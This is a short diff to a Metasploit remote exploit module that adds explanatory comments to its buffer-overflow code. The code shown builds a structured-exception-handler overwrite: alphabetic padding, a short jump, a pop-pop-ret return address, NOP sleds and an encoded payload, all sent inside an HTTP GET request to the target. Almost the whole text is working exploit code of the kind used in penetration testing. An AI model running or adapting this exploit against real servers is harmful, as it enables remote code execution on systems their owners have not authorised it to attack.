@@ -46,12 +46,16 @@ class Metasploit3 < Msf::Exploit::Remote
     connect
 	print_status("Generating Shell Code")
     sploit = rand_text_alpha_upper(4061)
+    # Next SEH
     sploit << "\xeb\x0A\x90\x90"
+    # Pop Pop Ret
     sploit << target.ret
     sploit << make_nops(19)
+    # Payload
     sploit << payload.encoded
     sploit << make_nops(7)
 	print_status("Buffer length is: #{4500 - 4061 - 4 - 4 - 20 - payload.encoded.length - 20}")
+    # Just in case the Metasploit pyload size changes
     sploit << rand_text_alpha_upper(4500 - 4061 - 4 - 4 - 20 - payload.encoded.length - 20)
     sploit << " HTTP/1.0\r\n\r\n"
     send_cmd(['GET ', sploit], true)
